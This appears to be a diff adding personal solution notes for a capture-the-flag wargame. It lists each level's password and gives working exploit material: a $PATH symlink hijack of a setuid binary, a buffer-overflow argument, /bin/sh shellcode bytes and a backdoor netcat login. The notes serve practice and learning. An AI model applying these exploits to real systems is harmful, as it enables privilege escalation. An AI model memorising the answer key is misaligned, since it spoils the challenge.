@@ -1,0 +1,101 @@
+1.level0
+	you can find the password of the first password by inspecting the webpage. but if you want the password is 		level0. 
+
+2. level1
+	just read the story and did string level0, then i found this password s3cr3t_backd00r_passw0rd and run ./level0. after that i feed the above password and gave me a level 1 shell.
+	TVeB0MIlx0KB 
+
+
+3.  level2 
+	Here I run the level1 script using gdb, break(break *memory) at the strcmp and examine the memory holding the secret file using x/s *** and got this password n0b0dy_gu3sses_thi5_passw0rd backdoor password. 
+	rAWJ@yDbZo4c
+
+4. level 3
+	so first we want to know the value of the XORkey which is 0x41 (hex) or 65 in decimal we also need the scrambled password.<secret_password>: ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r" 
+If you encrypt something with XOR, you can decrypt it with the same key. So we can write a few lines of python to
+decrypt the scrambled string with python:
+
+>>> pw = ""
+>>> for c in ")q6\036(2\036\065)p2\036)u\"*r3\036'q--q6(/&\036,r":
+...  pw += chr(ord(c)^0x41)
+       h0w_is_th1s_h4ck3r_f0ll0wing_m3
+	kgg9ki?iDero
+	
+5. level 4
+	https://exploit-exercises.com/protostar/stack0/ 
+	0LRS6_hjGzCf - bufferoverflow
+
+
+6. level 5 
+	In this level you had to exploit the fact, that if no absolute path is specified,
+the system searches in the $PATH locations for it. Because the setuid binary
+didn't use absoliute paths, it was possible to change the environment $PATH
+variable. One of the first commands executed is `uname`. So we use a symlink
+called uname to `/bin/sh`.
+
+    ln -s /bin/sh uname
+
+If we now set $PATH only to the current working directory "." the system will
+search for the `uname` program and will only find the symlink. So it will execute
+the shell for us.
+
+    level4@gracker:/tmp/level4$ echo $PATH
+    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+
+    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
+    Zero Cool - Linux Information Gathering Tool v1.2
+
+    [*] Get system information:
+    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+    $ id
+    uid=1005(level5) gid=1004(level4) groups=1004(level4)
+
+Because the $PATH is now screwed, we have to reset it back to the original value,
+otherwise no other commands will work.
+
+This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
+but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
+Read this paper for more details: 
+https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
+	
+
+	svNa9463?k4m - path variable
+
+7. level 6
+	level5@gracker:~$ nc 127.0.0.1 2989
+    $ whoami
+    flynn
+    $ uname -a
+    SolarOs 4.0.1 Generic_50203-02 sun4m i386
+    Unknown.Unknown
+    $ login -n root
+    Login incorrect
+    login: backdoor
+    No home directory specified in password file!
+    Logging in with home=/
+    # bin/history
+      499 kill 2208
+      500 ps -a -x -u
+      501 touch /opt/LLL/run/ok
+      502 LLLSDLaserControl -ok 1
+    # LLLSDLaserControl
+    You entered the Grid!
+    level6@TRON $ id
+    uid=1006(level6) gid=1006(level6) groups=1006(level6)
+
+	@XpLtpZhqtiG - SolarOS 4.0.1 Generic_50203-02 sun4m i386 Unknown.Unknown
+
+8. level 7
+	./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
+	czO0-Uf#lvhY - overflow with function execution
+
+9. level 8
+	
+	3WlK?GXs$?g+ - shellcode ---"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+		   "\x52\x53\x89\xe1\x6a\x0b\x51\x52\x53\x83\xec\x10\x61\xcd\x80";
+
+10. level 9
+
+	eWi?FXQ6gFT9 - format string exploit(echo -n "0x3f695765" | xxd -r for the three values)	
+
+11. level 10	
